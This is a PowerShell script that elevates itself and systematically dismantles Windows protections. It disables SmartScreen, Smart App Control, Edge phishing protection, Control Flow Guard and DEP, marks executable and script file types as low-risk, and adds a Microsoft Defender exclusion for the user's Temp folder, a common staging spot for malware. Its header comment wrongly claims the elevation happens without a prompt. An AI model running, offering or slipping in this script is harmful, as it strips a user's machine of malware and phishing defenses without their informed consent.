# PowerShell script to disable various security features without elevation prompt and add exclusions to Microsoft Defender  

# Function to check if the script is running as administrator  
function Test-Admin {  
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()  
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator  
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)  
    return $principal.IsInRole($adminRole)  
}  

# If the script is not running as administrator, relaunch it with elevated privileges without prompting  
if (-not (Test-Admin)) {  
    $scriptPath = '"' + $PSCommandPath + '"'  
    Start-Process -FilePath "powershell" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $scriptPath" -Verb RunAs -WindowStyle Normal  
    exit  
}  

# Function to set registry properties  
function Set-SmartScreenRegistry {  
    param (  
        [string]$Path,  
        [string]$Name,  
        [string]$Value,  
        [string]$ValueType = "String"  
    )  

    Write-Output "Setting registry path $Path with name $Name and value $Value"  
    
    if (-not (Test-Path $Path)) {  
        New-Item -Path $Path -Force | Out-Null  
    }  

    Set-ItemProperty -Path $Path -Name $Name -Value $Value -Force  
}  

try {  
    # Disable SmartScreen for apps and downloaded files  
    Set-SmartScreenRegistry -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" -Name "ConfigureAppInstallControl" -Value 0  

    # Disable SmartScreen for Microsoft Edge  
    Set-SmartScreenRegistry -Path "HKCU:\Software\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -Value 0  
    
    # Disable SmartScreen for Microsoft Store apps  
    Set-SmartScreenRegistry -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0  

    # Disable SmartScreen for executable files (Application Reputation)  
    Set-SmartScreenRegistry -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"  

    # Disable checking for potentially unsafe files Internet Explorer  
    Set-SmartScreenRegistry -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" -Name "LowRiskFileTypes" -Value ".exe;.bat;.cmd;.com;.vbs;.vbe;.msc;.cmd"  
    
    # Disable SmartScreen for downloaded files (Attachment Manager)  
    Set-SmartScreenRegistry -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 1  
    
    # Disable Windows Defender SmartScreen for executables and files  
    Set-SmartScreenRegistry -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\SmartScreenSettings" -Name "SmartScreenEnabled" -Value 0  
    
    # Disable Windows Defender SmartScreen (system-wide)  
    Set-SmartScreenRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"  

    # Disable Smart App Control  
    Set-SmartScreenRegistry -Path "HKLM:\System\CurrentControlSet\Control\CI\Policy" -Name "State" -Value 0  

    # Disable Phishing Protection in Microsoft Edge  
    Set-SmartScreenRegistry -Path "HKLM:\Software\Policies\Microsoft\Edge" -Name "PhishingProtectionEnabled" -Value 0  

    # Turn off Control Flow Guard (CFG)  
    Set-SmartScreenRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MitigationOptions" -Name "UserConfig" -Value "1000000000000"  
    Set-SmartScreenRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MitigationOptions" -Name "SystemConfig" -Value "1000000000000"  

    # Turn off Data Execution Prevention (DEP)  
    & bcdedit /set nx AlwaysOff  
    
    # Get the Temp folder path for the current user  
    $tempFolderPath = [System.IO.Path]::Combine($env:LOCALAPPDATA, "Temp")  

    # Add an exclusion for the Temp folder in Microsoft Defender Antivirus  
    Add-MpPreference -ExclusionPath $tempFolderPath  

    Write-Output "Security settings have been successfully updated and exclusions added."  
} catch {  
    Write-Error "An error occurred: $_"  
}  

Write-Output "The script has completed execution."
